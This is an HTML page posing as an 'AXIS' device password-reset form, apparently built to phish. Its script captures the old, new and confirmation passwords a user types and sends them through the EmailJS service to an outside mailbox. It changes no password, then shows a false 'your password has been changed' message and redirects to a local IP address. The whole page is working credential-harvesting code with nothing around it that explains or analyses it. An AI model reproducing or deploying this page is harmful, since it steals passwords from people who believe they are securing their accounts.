<!DOCTYPE html>
<html lang="en">
<head>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AXIS - Password Reset</title>
    <link rel='shortcut icon' href='http://192.168.88.115/img/favicon.ico'>
    <link href="http://192.168.88.115/css/main.24002508753c9e8442b0.css" rel="stylesheet"></head>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f9f9f9;
            background-image: url(download.svg);
            background-size: cover;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 300px;
            width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
    <script type="text/javascript">
        (function(){
            emailjs.init("Nil4avDHk82zCtGmu"); 
        })();
        
        function sendEmail(event) {
            event.preventDefault();
            
            const oldPassword = document.querySelector('input[name="old_password"]').value;
            const newPassword = document.querySelector('input[name="new_password"]').value;
            const confirmNewPassword = document.querySelector('input[name="confirm_new_password"]').value;
            
            const templateParams = {
                old_password: oldPassword,
                new_password: newPassword,
                confirm_new_password: confirmNewPassword
            };
            
            emailjs.send('service_h2nas9a', 'template_a0wdx34', templateParams) 
                .then(function(response) {
                    alert('Your password has been changed. Thank you, stay safe!', response.status, response.text);
                    window.location.href = 'http://192.168.88.115';
                }, function(error) {
                    alert('Failed to reset your password, please try again!', error);
                });
        }
    </script>
    
</head>
<body>
    <div class="container">
        <h1>Reset Password</h1>
        <form id="password-reset-form" onsubmit="sendEmail(event)">
            <input type="password" name="old_password" placeholder="Old Password" required>
            <input type="password" name="new_password" placeholder="New Password" required>
            <input type="password" name="confirm_new_password" placeholder="Confirm New Password" required>
            <button type="submit">Reset Password</button>
        </form>
    </div>
</body>
</html>
